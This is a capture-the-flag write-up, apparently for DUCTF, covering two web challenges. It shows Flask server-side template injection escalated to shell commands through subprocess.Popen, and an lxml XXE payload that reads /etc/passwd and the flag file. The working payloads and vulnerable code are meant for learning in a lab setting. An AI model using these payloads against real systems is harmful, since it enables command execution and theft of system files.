* * *
![image](https://github.com/user-attachments/assets/744acab1-abef-48c8-babd-c61ed1646cc9)

* * *

### **Challenges**

### **Web**

-     Parrot the emu
-     Zoo feedback form
-     Co2
-     Confusion

---------------------------------

### Web

### Challenge: Parrot the emu

----------------------------------

![image](https://github.com/user-attachments/assets/8f1e8226-6491-4ec6-8705-30129f0adc5e)


- The index route `/` is the vulnerable part of the web app's code. The index page passes the `user_input` variable  to  the `render_template_string()` which is vulnerable to server side template injection in flask web apps' code.It allows an attacker to inject code into templaates.

      @app.route('/', methods=['GET', 'POST'])
      def vulnerable():
          chat_log = []
      
          if request.method == 'POST':
              user_input = request.form.get('user_input')
              try:
                  result = render_template_string(user_input)
              except Exception as e:
                  result = str(e)
      
              chat_log.append(('User', user_input))
              chat_log.append(('Emu', result))
          
          return render_template('index.html', chat_log=chat_log)

- Testing our little fact by executing \{\{7*7\}\},the server returned the value `49`

![image](https://github.com/user-attachments/assets/f30a52a9-2651-4f55-8e01-c577b0da806b)

### RCE

- I used the payload \{\{''.\_\_class\_\_.\_\_base\_\_.\_\_subclasses\_\_()\}\} to access the classes available

![image](https://github.com/user-attachments/assets/a4b3b2a7-ca56-4dbd-812d-d42543db5721)

- After checking the list of available classes, I got shell command access with class `subprocess.Popen` on index `213`

       Payload: ''.__class__.__base__.__subclasses__()[213]

![image](https://github.com/user-attachments/assets/ce45878b-c7f2-4b2a-9005-6784a09b30a3)

### Reading the flag

- Flag payload

      Payload: ''.__class__.__base__.__subclasses__()[213]("cat flag",shell=True,stdout=-1).communicate()

![image](https://github.com/user-attachments/assets/9312e1e3-ace1-42cc-8fff-53d6714c7bda)

- Flag-:```DUCTF{PaRrOt_EmU_ReNdErS_AnYtHiNg}```

---------------------------------------

### Challenge: Zoo Feedback form

![image](https://github.com/user-attachments/assets/25cbd005-207a-423c-b2e1-9403eb6efbb7)

- After reviewing the source code, I noticed that `resolve_entities` was set to `True` which forces lxml parser to resolve external entities. In a whole, the main vulnerability is `XML External Entity Expansion` which allows an attacker to inject xml entities into a web application.

  Vulnerable Code:
            
            try:
               parser = etree.XMLParser(resolve_entities=True)

- Fix: Set resolve_entities to `False`

- I intercepted the request with burpsuite

   ![image](https://github.com/user-attachments/assets/4da48e9d-c2f3-42ca-92b1-aeb1e05ba5ac)

- I used this payload to read the `/etc/passwd` file

  Payload:

      <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
                  <root>
                 <feedback>
                  &example;
                 </feedback>
                  </root>

![image](https://github.com/user-attachments/assets/7451bb98-b2c6-47f4-8c3b-17f946a889f2)

- Then, I read the flag located at `/app/flag.txt`.

            <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY example SYSTEM "/app/flag.txt"> ]>
                        <root>
                       <feedback>
                          &example;
                        </feedback>
                        </root>

![image](https://github.com/user-attachments/assets/ab20d730-43d0-48d2-99bd-f933e65dc8ee)

- Flag-:```DUCTF{emU_say$_he!!0_h0!@_ci@0}```

--------------------------
### References:
--------------------------

- Lxml.etree's XXE Attack: [Codeql's blog](https://codeql.github.com/codeql-query-help/python/py-xxe/)
- XXE's details: [Hacktrickz](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
